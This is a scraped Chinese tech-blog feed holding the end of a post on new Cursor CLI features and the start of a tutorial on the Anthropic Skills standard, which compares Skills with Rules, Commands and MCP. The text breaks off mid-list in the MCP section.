                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>前几天，cursor没有带来cursor IDE的更新，但是这次却带来了cursor CLI的更新。一直以来cursor都把IDE作为自身的重心来发展，这次终于开始像cc开始走终端AI发展了。</p>
<p>下面就直接来看看这次cursor 都给CLI带来了哪些新能力。</p>
<h3 data-id="heading-0">第一个，plan模式</h3>
<p>我们知道，plan模式在现在的AI IDE里面都已经是默认的模式了，这次cursor效仿cc带来了终端的plan模式。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/706c20df53054608a8e420bc5457780a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474038&amp;x-signature=vYnNmSedKTJvaqgtY0pVgRXQg4w%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>你可以通过 /plan 开启plan模式。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a4d19deb30ee4128bfc821ef7678fb48~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474038&amp;x-signature=HI4wM6BnCF6a09M8AkDH6yX%2FXE0%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>同时cursor cli也支持提问模式，通过/ask开启。</p>
<h3 data-id="heading-1">第二个，云端模式</h3>
<p>cc有自己的cloud ，可以方便的把一端的对话无缝的迁移到其他平台，让AI在后台持续为你工作。这次cursor也带来了自己的cloud 智能体，实现了CLI，web，手机端的对话分享。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/713f8ca35ea04e30b0532f587d2bcb91~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474038&amp;x-signature=ICe8%2B%2FGd1qiezRmT8qMs2nXGAPw%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>对于使用者，只需要在消息前面加上 &amp;，就可以把消息发送到云端了。</p>
<h3 data-id="heading-2">第三个，逐词级别的内联差异查看</h3>
<p>这次新版本CLI还增加了类似git diff的功能，方便的大家查看更改前后的差别，不过这个功能比git diff还更强了一步，精确到了单词级别的差别查看。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1b2c93d7340c4d3b981b49d18bb80103~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474038&amp;x-signature=7HuO98r5PbDXIJGw0o5oRngpwo4%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h3 data-id="heading-3">第四个，一键创建规则</h3>
<p>通过/rules 命令，可以直接创建rule，修改和查看已有的rule。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51d13f454c8b4f178b6066e75efc3178~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474038&amp;x-signature=P2f1unNkzOmQbusERNq61SZKJyk%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h3 data-id="heading-4">第五个，一键创建命令</h3>
<p>和rule一样，CLI也提供了/commands 命令来创建，编辑，查看命令。</p>
<p>伴随着这次的更新，CLI的打开方式也迎来了简化，过去开启CLI的方式是使用cursor-agent，这次直接简化为如下方式</p>
<p>除了前面提到的plan和ask模式，agent就是默认的模式，因为agent模式可以访问所有的工具，最适合处理复杂的编码任务。</p>
<h3 data-id="heading-5">第六个，debug模式</h3>
<p>写代码一时爽，debug的时候火葬场，每个程序员都会经理bug的多次打击，这次的cursor CLI也带来额debug模式来帮你做debug的事情。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/61a4418c478242bebbbe211ce88616de~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474038&amp;x-signature=Rz6MozRZDY7XQnfgyisz9f%2BLzUg%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>当CLI也难以解决某个bug的时候，不会在那里瞎猜小号你的耐心，会自动查看运行时状态信息来尝试解决。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从 Rules 到 Skills：用 Anthropic 开放标准重构你的 AI 编程工作流]]></title>    <link>https://juejin.cn/post/7596970073749585956</link>    <guid>https://juejin.cn/post/7596970073749585956</guid>    <pubDate>2026-01-20T01:04:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596970073749585956" data-draft-id="7596971669862465577" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从 Rules 到 Skills：用 Anthropic 开放标准重构你的 AI 编程工作流"/> <meta itemprop="keywords" content="AI编程"/> <meta itemprop="datePublished" content="2026-01-20T01:04:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Lambert281"/> <meta itemprop="url" content="https://juejin.cn/user/2253355646455980"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从 Rules 到 Skills：用 Anthropic 开放标准重构你的 AI 编程工作流
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2253355646455980/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Lambert281
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T01:04:07.000Z" title="Tue Jan 20 2026 01:04:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读23分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">从 Rules 到 Skills：用 Anthropic 开放标准重构你的 AI 编程工作流</h2>
<blockquote>
<p>基于 Java 后端 Skills 实战（REST API / Service / 异常处理 / 校验 / 日志 / MyBatis-Plus）</p>
<p>本文适合作为一篇 CSDN 博客发布，系统介绍 Skills 标准、工具链以及一个完整的 Java 后端 Skills 实战项目。</p>
<p>GitHub 项目地址：<code>https://github.com/lambert0529/skills</code></p>
</blockquote>
<blockquote>
<p><strong>说明</strong>：本文档基于 <strong>Anthropic Skills 开放标准</strong>编写，全面介绍 Skills 的概念、使用方法和最佳实践，并结合 Java 后端 Skills 进行实战演示。适用于所有支持该标准的 AI 编程助手（Cursor、Claude Code、Windsurf、Aider 等）。</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">📖 目录</h3>
<ol>
<li><a href="#1-skill-%E6%98%AF%E4%BB%80%E4%B9%88" title="#1-skill-%E6%98%AF%E4%BB%80%E4%B9%88">Skill 是什么</a></li>
<li><a href="#2-skill-vs-rules-vs-busagent-vs-commands-vs-mcp-%E5%AF%B9%E6%AF%94" title="#2-skill-vs-rules-vs-busagent-vs-commands-vs-mcp-%E5%AF%B9%E6%AF%94">Skill vs Rules vs BusAgent vs Commands vs MCP 对比</a></li>
<li><a href="#3-%E5%90%84%E5%A4%A7%E7%BC%96%E8%BE%91%E5%B7%A5%E5%85%B7%E5%AF%B9-skills-%E7%9A%84%E6%94%AF%E6%8C%81%E5%92%8C%E9%80%82%E9%85%8D%E8%BF%9B%E5%BA%A6" title="#3-%E5%90%84%E5%A4%A7%E7%BC%96%E8%BE%91%E5%B7%A5%E5%85%B7%E5%AF%B9-skills-%E7%9A%84%E6%94%AF%E6%8C%81%E5%92%8C%E9%80%82%E9%85%8D%E8%BF%9B%E5%BA%A6">各大编辑工具对 Skills 的支持和适配进度</a></li>
<li><a href="#4-skills-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%E5%92%8C%E7%BB%86%E8%8A%82" title="#4-skills-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%E5%92%8C%E7%BB%86%E8%8A%82">Skills 使用技巧和细节</a></li>
<li><a href="#5-openskills-%E4%BD%BF%E7%94%A8%E7%BB%86%E8%8A%82" title="#5-openskills-%E4%BD%BF%E7%94%A8%E7%BB%86%E8%8A%82">OpenSkills 使用细节</a></li>
<li><a href="#6-%E6%9C%AC%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E7%9A%84-skills" title="#6-%E6%9C%AC%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E7%9A%84-skills">本项目开发的 Skills</a></li>
</ol>
<hr/>
<h3 data-id="heading-2">1. Skill 是什么</h3>
<h4 data-id="heading-3">1.1 定义</h4>
<p><strong>Skills（技能）</strong> 是由 <strong>Anthropic</strong> 提出的一个<strong>开放标准（Open Standard）</strong>，用于增强 AI Agent 在特定任务上的能力。Skills 是一种可重用、结构化的知识包，封装了特定领域知识、工作流程、脚本和最佳实践，供 Agent 根据任务需要按需加载，而不是始终包含在上下文中。</p>
<h4 data-id="heading-4">1.2 核心特性</h4>
<ul>
<li>🌐 <strong>开放标准</strong>：由 Anthropic 定义，遵循统一的规范格式</li>
<li>🔄 <strong>跨平台兼容</strong>：可在多个 AI 编程助手间共享（Cursor、Claude Code、Windsurf、Aider 等）</li>
<li>📦 <strong>渐进式加载</strong>：采用"渐进式披露（Progressive Disclosure）"机制，节省上下文窗口</li>
<li>🔧 <strong>可扩展</strong>：支持自定义命令、钩子脚本、领域知识等多种内容类型</li>
<li>🎯 <strong>智能匹配</strong>：Agent 自动扫描技能描述，根据任务相关性匹配技能</li>
</ul>
<h4 data-id="heading-5">1.3 标准结构</h4>
<p>根据 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fanthropics%2Fskills" target="_blank" title="https://github.com/anthropics/skills" ref="nofollow noopener noreferrer">Anthropic Skills 开放标准</a>，每个 Skill 应该包含以下结构：</p>
<pre><code class="hljs language-bash" lang="bash">skill-name/
├── SKILL.md          <span class="hljs-comment"># 必需：技能定义（YAML front matter + Markdown）</span>
├── scripts/          <span class="hljs-comment"># 可选：脚本文件（自动化任务逻辑）</span>
├── assets/           <span class="hljs-comment"># 可选：资源文件（用于输出的模板、图标、字体等）</span>
└── references/       <span class="hljs-comment"># 可选：文档和参考资料（按需加载）</span>
</code></pre>
<h4 data-id="heading-6">1.4 SKILL.md 格式</h4>
<p><strong>YAML Front Matter</strong>（必需）：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-meta">---</span>
<span class="hljs-attr">name:</span> <span class="hljs-string">skill-name</span>          <span class="hljs-comment"># 必需：技能名称（kebab-case）</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">技能描述</span>      <span class="hljs-comment"># 必需：技能描述（用于 Agent 匹配任务，应包含具体使用场景）</span>
<span class="hljs-meta">---
</span></code></pre>
<p><strong>Markdown 内容</strong>：</p>
<ul>
<li>技能说明、使用方法、行为定义等</li>
<li>应保持简洁（&lt;500行，推荐&lt;300行）</li>
<li>详细内容放在 <code>references/</code> 中</li>
</ul>
<h4 data-id="heading-7">1.5 渐进式披露原则</h4>
<p>Skills 使用三级加载系统来高效管理上下文：</p>
<ol>
<li><strong>Metadata（name + description）</strong> - 始终在上下文中（~100 词）</li>
<li><strong>SKILL.md body</strong> - 当技能触发时加载（&lt;5k 词，建议 &lt;300 行）</li>
<li><strong>Bundled resources</strong> - 按 Claude 需要时加载（无限制，因为脚本可以执行而不读入上下文窗口）</li>
</ol>
<p><strong>关键原则</strong>：</p>
<ul>
<li>保持 SKILL.md 简洁，只包含核心流程和指导</li>
<li>详细内容移到 <code>references/</code> 文件</li>
<li>使用链接引用详细内容，确保读者知道它们存在以及何时使用</li>
<li>避免深层嵌套引用 - 保持 references 从 SKILL.md 一级深度</li>
</ul>
<hr/>
<h3 data-id="heading-8">2. Skill vs Rules vs BusAgent vs Commands vs MCP 对比</h3>
<h4 data-id="heading-9">2.1 概念对比表</h4>





































































































































<table><thead><tr><th>特性</th><th>Skills（技能）</th><th>Rules（规则）</th><th>BusAgent</th><th>Commands（命令）</th><th>MCP（模型上下文协议）</th></tr></thead><tbody><tr><td><strong>标准/协议</strong></td><td>Anthropic Skills 开放标准</td><td>平台特定（如 Cursor Rules）</td><td>平台特定</td><td>平台特定（Slash Commands）</td><td>Model Context Protocol 开放协议</td></tr><tr><td><strong>核心作用</strong></td><td>教 Agent <strong>如何做</strong>，提供知识、流程、判断、风格</td><td>对 Agent 输出/行为的静态约束或规范</td><td>业务代理，封装业务逻辑</td><td>简单的 prompt 模板，快速执行特定行为</td><td>给 Agent <strong>能做什么动作</strong>，访问外部系统/数据/工具</td></tr><tr><td><strong>执行能力</strong></td><td>本身不直接执行外部动作（除非 Skill 内含脚本并被执行）</td><td>没有执行外部工具能力，仅约束文本/输出内容</td><td>可执行业务逻辑和外部调用</td><td>无执行能力，仅提供 prompt 模板</td><td>本质是执行动作/调用外部逻辑</td></tr><tr><td><strong>文件结构</strong></td><td>目录形式：<code>SKILL.md</code> + 脚本/模板/资源</td><td><code>.mdc</code> 或 <code>.md</code> 文件</td><td>配置文件或代码</td><td>单个 Markdown 文件</td><td>JSON 配置</td></tr><tr><td><strong>加载方式</strong></td><td>渐进式加载（按需，扫描名称和描述后决定）</td><td>静态加载（总是或按规则）</td><td>按需加载</td><td>手动显式调用（用户输入 <code>/command</code>）</td><td>按需调用外部服务</td></tr><tr><td><strong>上下文消耗</strong></td><td>低（渐进式披露，仅在需要时载入）</td><td>中等（常驻文本，可能消耗较多 Token）</td><td>中等（按需加载）</td><td>低（仅在调用时加载）</td><td>工具描述占用部分，工具调用开销较大</td></tr><tr><td><strong>自动发现</strong></td><td>✅ 支持（Agent 扫描匹配）</td><td>✅ 支持（自动包含）</td><td>✅ 支持（按需匹配）</td><td>❌ 不支持（需显式调用）</td><td>✅ 支持（按需调用）</td></tr><tr><td><strong>使用场景</strong></td><td>特定任务的专业能力、工作流程、领域知识</td><td>编码规范、团队标准、全局规则</td><td>业务场景封装、复杂业务流程</td><td>快速简短、频繁重用的命令</td><td>访问外部数据源、执行外部工具、查询数据库</td></tr><tr><td><strong>存放位置</strong></td><td><code>.agent/skills/</code>（通用）或 <code>.claude/skills/</code></td><td><code>.cursor/rules/*.mdc</code> 或 <code>AGENTS.md</code></td><td>平台特定目录</td><td><code>.claude/commands/</code> 或 <code>.cursor/commands/</code></td><td><code>.cursor/mcp.json</code> 或 <code>~/.cursor/mcp.json</code></td></tr><tr><td><strong>文件格式</strong></td><td><code>SKILL.md</code>（YAML front matter + Markdown，标准格式）</td><td><code>.mdc</code> 或 <code>.md</code>（平台特定）</td><td>配置文件或代码</td><td><code>.md</code>（简单 Markdown，无特殊格式要求）</td><td>JSON 配置</td></tr><tr><td><strong>触发方式</strong></td><td>Agent 扫描匹配或 <code>/skill-name</code> 命令</td><td>自动包含或按匹配规则</td><td>按业务场景匹配</td><td>用户显式输入 <code>/command-name</code></td><td>Agent 需要时调用</td></tr><tr><td><strong>可移植性</strong></td><td>高（开放标准，跨平台兼容）</td><td>较有限（平台专有格式）</td><td>较有限（平台专有）</td><td>较有限（平台专有，但格式简单）</td><td>较好（协议标准，但不同 Agent 支持程度可能不同）</td></tr><tr><td><strong>创建难度</strong></td><td>中等（需要 SKILL.md + 可选脚本/资源）</td><td>最基础（创建门槛低）</td><td>较高（需要业务逻辑设计）</td><td>低（只需一个 Markdown 文件）</td><td>较高（需搭建 server、定义 schema、权限、安全、认证等）</td></tr><tr><td><strong>安全性</strong></td><td>如果 Skill 中含脚本，有代码执行权限，需要谨慎信任来源</td><td>相对安全（只包含文本规则，没有执行外部代码）</td><td>中等（可执行业务逻辑）</td><td>相对安全（仅文本 prompt，无脚本执行）</td><td>动作调用本身含有安全性风险，权限控制必需</td></tr><tr><td><strong>复杂度支持</strong></td><td>高（支持多文件、脚本、复杂流程）</td><td>低（静态规则）</td><td>高（支持复杂业务逻辑）</td><td>低（简单 prompt 模板）</td><td>高（可连接复杂外部系统）</td></tr></tbody></table>
<h4 data-id="heading-10">2.2 详细对比</h4>
<h5 data-id="heading-11">Skills（技能）- Anthropic 开放标准</h5>
<p><strong>定义</strong>：Skills 是由 Anthropic 定义的开放标准，用于封装复杂的能力包，包含 <code>SKILL.md</code> 文件以及可选的脚本、模板、参考资料等资源。</p>
<p><strong>优势</strong>：</p>
<ul>
<li>✅ <strong>开放标准</strong>：遵循 Anthropic Skills 规范，跨平台兼容</li>
<li>✅ <strong>节省上下文</strong>：渐进式加载机制，只在需要时加载</li>
<li>✅ <strong>灵活性强</strong>：可以根据任务动态选择使用</li>
<li>✅ <strong>可复用</strong>：一次定义，可在多个项目、多个 Agent 平台间共享</li>
<li>✅ <strong>模块化</strong>：每个技能专注一个功能领域，职责清晰</li>
</ul>
<p><strong>适用场景</strong>：</p>
<ul>
<li>代码审查、测试生成、文档生成等特定任务</li>
<li>需要复杂工作流程的场景</li>
<li>团队共享的专业知识和最佳实践</li>
<li>跨项目、跨平台的知识复用</li>
</ul>
<h5 data-id="heading-12">Rules（规则）</h5>
<p><strong>定义</strong>：Rules 是对 Agent 输出/行为的静态约束或规范，通常以 <code>.mdc</code> 或 <code>.md</code> 文件形式存在。</p>
<p><strong>优势</strong>：</p>
<ul>
<li>✅ 持续生效：始终包含在上下文中</li>
<li>✅ 稳定性高：功能成熟，广泛使用</li>
<li>✅ 自动应用：无需手动触发</li>
</ul>
<p><strong>劣势</strong>：</p>
<ul>
<li>⚠️ 占用上下文：始终加载，可能占用较多 token</li>
<li>⚠️ 不够灵活：所有对话都会包含，即使不相关</li>
</ul>
<p><strong>适用场景</strong>：</p>
<ul>
<li>编码规范、命名约定</li>
<li>项目结构说明</li>
<li>团队工作流程</li>
<li>需要持续指导的规则</li>
</ul>
<h5 data-id="heading-13">BusAgent（业务代理）</h5>
<p><strong>定义</strong>：BusAgent 是平台特定的业务代理机制，用于封装业务逻辑和复杂业务流程。</p>
<p><strong>优势</strong>：</p>
<ul>
<li>✅ 业务逻辑封装：可以封装复杂的业务场景</li>
<li>✅ 可执行：可以执行业务逻辑和外部调用</li>
</ul>
<p><strong>劣势</strong>：</p>
<ul>
<li>⚠️ 平台特定：不同平台实现不同</li>
<li>⚠️ 复杂度高：需要业务逻辑设计</li>
</ul>
<p><strong>适用场景</strong>：</p>
<ul>
<li>复杂业务流程封装</li>
<li>业务场景自动化</li>
<li>平台特定的业务逻辑</li>
</ul>
<h5 data-id="heading-14">Commands（命令）- Slash Commands</h5>
<p><strong>定义</strong>：Commands（也称为 Slash Commands）是简单的 prompt 模板，通常是一个 Markdown 文件，用于快速执行特定行为。</p>
<p><strong>优势</strong>：</p>
<ul>
<li>✅ <strong>简单快速</strong>：只需一个 Markdown 文件，编辑方便</li>
<li>✅ <strong>可控性强</strong>：用户明确触发，行为可预测</li>
<li>✅ <strong>安全性好</strong>：内容简单，无复杂依赖，审查容易</li>
</ul>
<p><strong>劣势</strong>：</p>
<ul>
<li>⚠️ <strong>灵活性低</strong>：不支持复杂流程、多个文件、标准化资源</li>
<li>⚠️ <strong>自动化能力差</strong>：需要用户每次明确调用，不能基于上下文自动匹配</li>
</ul>
<p><strong>适用场景</strong>：</p>
<ul>
<li>快速简短、频繁重用的命令</li>
<li>简单的 prompt 模板，如 <code>/review code</code>、<code>/optimize</code></li>
<li>不需要复杂脚本或流程的行为</li>
</ul>
<h5 data-id="heading-15">MCP（Model Context Protocol）</h5>
<p><strong>定义</strong>：MCP 是 Model Context Protocol 的缩写，是一个开放协议，用于连接外部系统、获取实时数据、执行外部工具。</p>
<p><strong>优势</strong>：</p>
<ul>
<li>✅ 连接外部系统：可以访问数据库、API、文件系统等</li>
<li>✅ 实时数据：获取最新的外部数据</li>
